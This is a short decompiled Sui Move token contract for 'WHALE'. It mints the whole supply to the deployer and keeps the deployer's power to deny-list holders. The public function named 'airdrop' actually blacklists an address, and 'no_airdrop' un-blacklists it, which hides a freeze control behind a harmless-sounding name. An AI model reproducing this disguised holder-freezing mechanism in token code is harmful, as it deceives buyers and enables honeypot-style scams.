module 0x525adaa567de0229101b1f01dfebcaf1d88060ba5378cb3d9e66ff6cc32b1634::whale {
    struct WHALE has drop {
        dummy_field: bool,
    }

    public fun airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WHALE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WHALE>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: WHALE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WHALE>(arg0, 9, b"WHALE", b"WHALE SUI", b"The token that started it all.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://static-00.iconduck.com/assets.00/connection-loading-icon-2048x2048-cey8tjfo.png")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WHALE>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WHALE>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<WHALE>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<WHALE>>(v3, 0x2::tx_context::sender(arg1));
    }

    public fun no_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WHALE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<WHALE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

